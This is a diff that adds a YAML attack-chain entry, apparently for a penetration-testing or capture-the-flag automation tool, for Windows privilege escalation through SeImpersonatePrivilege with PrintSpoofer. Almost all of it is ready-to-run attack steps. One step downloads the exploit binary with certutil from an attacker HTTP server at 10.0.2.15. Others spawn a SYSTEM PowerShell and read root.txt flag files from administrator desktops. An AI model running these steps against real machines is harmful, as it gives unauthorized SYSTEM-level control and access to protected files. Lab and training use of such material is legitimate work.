@@ -1,0 +1,41 @@
+chain_id: seimpersonate_printspoofer
+title: "Windows privesc — SeImpersonatePrivilege via PrintSpoofer"
+severity: CRITICAL
+tags: [windows, privesc, seimpersonate, printspoofer, potato]
+
+trigger:
+  any_of:
+    - { kind: "windows-privilege", banner_pattern: "(?i)SeImpersonatePrivilege" }
+
+description: |
+  `whoami /priv` shows SeImpersonatePrivilege as Enabled (typical on service
+  accounts: IIS pools, MSSQL, network service). PrintSpoofer abuses the
+  print spooler RPC to make SYSTEM connect back, then steals its token.
+
+steps:
+  - id: 1
+    title: "Upload the binary to the target"
+    command: upload PrintSpoofer64.exe
+    notes: |
+      Or fetch it from a Kali HTTP server with certutil:
+        certutil -urlcache -f http://10.0.2.15:8000/PrintSpoofer64.exe PrintSpoofer64.exe
+
+  - id: 2
+    title: "Run it to spawn a SYSTEM PowerShell"
+    command: .\PrintSpoofer64.exe -i -c powershell.exe
+
+  - id: 3
+    title: "Confirm SYSTEM"
+    command: whoami
+    notes: |
+      Should print: nt authority\system
+
+  - id: 4
+    title: "Read the target file"
+    command: |
+      type C:\Users\Administrador\Desktop\root.txt
+      type C:\Users\Administrator\Desktop\root.txt
+
+references:
+  - https://github.com/itm4n/PrintSpoofer
+  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/seimpersonate-from-high-to-system
